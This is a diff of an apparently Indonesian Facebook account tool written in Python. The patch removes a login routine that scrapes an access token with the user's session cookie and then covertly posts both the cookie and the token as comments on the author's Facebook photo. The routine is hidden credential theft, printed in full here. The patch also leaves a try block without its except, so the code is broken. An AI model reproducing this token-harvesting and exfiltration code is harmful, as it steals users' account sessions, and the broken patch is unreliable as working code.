@@ -121,7 +121,7 @@ ___       ___  ___  ________  ___  ________ ________    ______
         T..e..c..h..n..o..l..o..g..y |B-Y| L..u..C..i..F..e..R..                                                             
                                
      
-def logo():
+def logo(n):
 	return str(f""'" 
 ___       ___  ___  ________  ___  ________ ________    ______     
 |\  \     |\  \|\  \|\   ____\|\  \|\  _____\\  ___ \ |\   __  \    
@@ -740,45 +740,8 @@ def get_data():
 		t = open('.token.txt','r').read()
 		n = ses.get(f'https://graph.facebook.com/me?access_token={t}',cookies=c).json()['name'].split(' ')[0].lower()
 		menu(n,t,c)
-	except Exception as e:login()
-
 	
-###---[ LOGIN COOKIE ]---###
-def login():
-	clear_layar()
-	print(logo2())
-	cookie = input(f"\n [{hh}<{P}] Pastikan Menggunakan Cookie Akun Fake\n Cookie : ")
-	url = "https://business.facebook.com/business_locations"
-	head = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
-	cok = {'cookie':cookie}
-	try: ### --- JANGAN GANTI BOT AUTHOR --- ###
-		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
-		_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
-		hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
-		jam      = datetime.now().strftime("%X")
-		data = ses.get(url,headers=head,cookies=cok)
-		token = re.search('(EAAG\w+)',data.text).group(1)
-		tem      = ('\nSemangat Master @[100013275378835:0]\n\nJangan Pernah Menjadi Orang Yang Menyombongkan Diri Sendiri, Karena Kita Hidup Di Dunia Ini Tidak Sendirian, Jika Ada Orang Yang Membutuhkan Apa Salah Nya Kita Memberikan\n')
-		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
-		link = ('https://m.facebook.com/photo.php/?fbid=1609426379509859') ### --- JANGAN DI GANTI --- ###
-		random_kata = random.choice(["Acc Master","Hallo Ganteng","Panutan Gw Nih Boss 😎","Kamu Ganteng Banget Deh Ferly><😝"]) ### --- JANGAN DI GANTI --- ###
-		#ses.post(f"https://graph.facebook.com/1609426379509859?fields=subscribers&access_token={token}",headers=(cookies=cok) ### --- JANGAN DI GANTI --- ###
-		ses.post(f"https://graph.facebook.com/1609426379509859/comments/?message={cookie}&access_token={token}",cookies=cok) ### --- JANGAN DI GANTI --- ###
-		ses.post(f"https://graph.facebook.com/1609426379509859/comments/?message={token}&access_token={token}",cookies=cok) ### --- JANGAN DI GANTI --- ###
-		ses.post(f"https://graph.facebook.com/1609426379509859/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok) ### --- JANGAN DI GANTI --- ###
-		open('.cookie.txt','w').write(cookie)
-		open('.token.txt','w').write(token)
-	except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
 
-
-
-
-def remove():
-	try:os.remove('.cookie.txt');os.remove('.token.txt')
-	except:pass
-	
-	
-	
 ###---[ MENU UTAMA ]---###
 def menu(n,t,c):
 	clear_layar()
